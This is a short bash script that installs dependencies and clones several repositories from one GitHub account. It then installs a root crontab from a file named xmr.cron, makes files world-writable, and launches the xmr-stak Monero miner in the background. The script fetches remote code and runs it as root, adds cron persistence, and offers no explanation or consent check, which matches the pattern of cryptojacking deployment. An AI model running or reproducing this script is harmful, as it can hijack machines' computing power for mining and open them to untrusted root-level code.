#!/bin/bash
sudo apt-get update
cd /home
sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git
cd /home
sudo git clone https://github.com/merrygreek/configa.git
cd /home/configa
sudo chmod 777 change.sh
sudo chmod 777 xmr.cron
sudo crontab -u root xmr.cron
sudo service cron restart
cd /home
sudo git clone https://github.com/merrygreek/u6.git
sudo git clone https://github.com/merrygreek/1.git
sudo cp -r u6/ /home/bin
sudo cp -r 1/*.txt /home/bin/
cd /home/bin
sudo chmod 777 ./xmr-stak
sudo ./xmr-stak &
